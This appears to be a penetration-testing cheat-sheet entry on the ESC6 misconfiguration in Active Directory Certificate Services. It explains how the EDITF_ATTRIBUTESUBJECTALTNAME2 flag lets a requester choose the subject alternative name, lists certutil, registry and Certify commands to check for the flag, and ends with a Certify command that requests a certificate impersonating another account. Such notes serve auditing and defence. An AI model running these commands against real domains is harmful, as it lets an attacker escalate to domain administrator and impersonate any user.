## Vulnerable `EDITF_ATTRIBUTESUBJECTALTNAME2` setting on CA allowing requesting certs for ANY user ##

#### What's running under the hood ####
- If this flag is set on the CA, any request (including when the subject is built from Active Directory®) can have user defined values in the subject alternative name.

#### What the attack is about ####
- This means that an attacker can enroll in ANY template configured for domain authentication that also allows unprivileged users to enroll (e.g., the default User template) and obtain a certificate that allows us to authenticate as a domain admin (or any other active user/machine).

### Enumeration ###
1. **certutil**
`PS C:\ADCS\Auditor> certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"`

2. **Registry**
`PS C:\ADCS\Auditor> reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags`

3. **Certify**
`PS C:\ADCS\Auditor> .\Certify.exe find`

### Exploitation ###
`PS C:\ADCS\Auditor> .\Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin`